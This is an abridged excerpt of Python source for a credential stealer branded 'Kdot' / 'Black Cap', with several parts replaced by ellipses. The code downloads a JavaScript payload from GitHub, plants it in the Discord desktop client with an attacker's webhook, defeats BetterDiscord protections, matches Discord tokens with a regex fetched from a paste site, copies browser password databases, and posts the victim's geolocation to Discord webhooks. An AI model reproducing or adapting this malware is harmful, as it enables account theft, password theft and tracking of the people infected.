...
__config__ = {
    ...
    'Kdot_inject_url': "https://github.com/Agonyxxx/SCP/tree/main/index.js",
    'hide': '%_hide_script%',
    'ping': '%ping_enabled%',
    'pingtype': '%ping_type%',
...
Kdot_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
reg_req = requests.get(Kdot_Regex) 
clear_reg = r"[\w-]{24}\."
...
class bc_initial_func(Functions):
    ...
    def ping_on_running(self: str) -> str:
        ping1 = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/1249063735096512532/1249065227840917514/Ephoto360com_166649f1e1f506_result.png?ex=6665f224&is=6664a0a4&hm=9ed510f07e4b6dbd0f3f1e04d45462b2dbad461500453c2533c930e67ee73f0e&',
            'content': "@everyone"
            }
        ping2 = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/1249063735096512532/1249065227840917514/Ephoto360com_166649f1e1f506_result.png?ex=6665f224&is=6664a0a4&hm=9ed510f07e4b6dbd0f3f1e04d45462b2dbad461500453c2533c930e67ee73f0e&',
                            ...
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                ...
                                if ntpath.exists(inj_path):
                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(inj_path + 'Kdot', exist_ok=True)
                                        except PermissionError:
                                            pass
                                    if self.regex_webhook_dsc in self.discord_webhook:
                                        f = httpx.get(self.fetch_conf('Kdot_inject_url')).text.replace("%WEBHOOK%", self.discord_webhook)#.replace("%num_core_discord%", inj_path + 'index.js')
                                    try:
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['Kdot_is_here'] = "https://github.com/Agonyxxx"
            ...
            with open(config, 'a') as f:
                f.write("\n\n//Kdot_is_here | https://github.com/Agonyxxx")
    ...
    async def bypass_bttdsc(self):
        ...
        if ntpath.exists(bd):
            ...
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'Kdotishere')
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("Black Cap Create By KS.H | https://github.com/Agonyxxx\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\nBlack Cap Create By Kdot | https://github.com/Agonyxxx")
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'Kdot v2.3',
                        'url': 'https://github.com/Agonyxxx',
                        'icon_url': 'https://cdn.discordapp.com/attachments/1249063735096512532/1249065227840917514/Ephoto360com_166649f1e1f506_result.png?ex=6665f224&is=6664a0a4&hm=9ed510f07e4b6dbd0f3f1e04d45462b2dbad461500453c2533c930e67ee73f0e&'
                    },
                    'color': 374276,
                    'description': f'[Kdot has Geo Localised this guy]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                    ...
                    'footer': {
                        'text': 'Black Cap Create By Kdot・https://github.com/Agonyxxx'
                    }
                }
            ]
        }
    ...
    if name == "bc_checking":
        ...
        "embeds": [
            ...
            "author": {
                'name': f'Kdot',
                'url': 'https://github.com/Agonyxxx',
                'icon_url': 'https://raw.githubusercontent.com/Kdotdsc/DestruCord-Inject/main/Kdot.gif'
            },
            "footer": {
                "text": "github.com/Kdotdsc"
            },
            'color': 374276,
            }
        ],
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"Created by Kdot | https://github.com/Agonyxxx\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
...
def getPassw(path, arg):
    ...
    tempfold = temp + "Kdoted" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
